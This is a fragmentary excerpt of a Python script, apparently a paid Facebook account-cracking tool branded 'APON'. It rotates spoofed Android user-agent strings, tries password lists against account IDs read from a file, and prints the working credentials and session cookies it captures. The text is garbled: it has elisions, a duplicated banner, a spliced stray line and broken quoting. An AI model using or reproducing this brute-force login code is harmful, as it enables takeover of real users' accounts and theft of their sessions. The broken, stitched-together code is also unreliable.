...
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X669D Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X669C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X669 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X669 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36",]
...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mAPON')
...
while attemps < 12345677901:
    ...
    if username == 'ARAFAT and password == 'APON':
...
os.system('espeak -a 300 " Welcome,   to,  my,  Tools,  I, am, APON"')
os.system('xdg-open https://www.facebook.com/Link.')
def banner():
	os.system("clear")
	print (f"""
\33[1;96m █████  ██████   ██████  ███    ██ 
...
\33[1;96m╔═════════════════════════════════════════╗
\033[93m ║ AUTHOR > \x1b[1;91mAPON
\033[32m ║ FB > \x1b[1;97mBerfin Luck
\033[95m ║ GITHUB > \x1b[0;34mapon200490
\33[1;96m║ CONTACT > \033[93m+8801600443219  \033[95m [√] \033[95m WHATSAPP ///
\033[93m ║ TOOL  STATUS > \33[1;96mPAID
\33[1;96m╚═════════════════════════════════════════╝""")
def login():
	#print(logo)
	banner()
	APON('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	APON('\033[0;97m===============================================')
	APON= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if APON in ['m']:
		public()
	elif APON in ['1']:
		crack_file()
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/apon.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[APON-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#APON-
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•APON-Cp] {idf} • {pw}')     
				...
				#APON-
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•APON-Ok🥴] {idf} • {pw}\n\033[0;93m[😈]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m══════════════════════════════════════════════╗')
				os.system('espeak -a 300 " APON,  Ok,  id"')
...
login() 	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
...
\033[32m ║ FB > \x1b[1;97mBerfin Luck
\033[95m ║ GITHUB > \x1b[0;34mapon200490
\33[1;96m║ CONTACT > \033[93m+8801643537105  \033[95m [√] \033[95m WHATSAPP ///
\033[93m ║ TOOL  STATUS > \33[1;96mPAID
\33[1;96m╚═════════════════════════════════════════╝""")
def login():
	#print(logo)
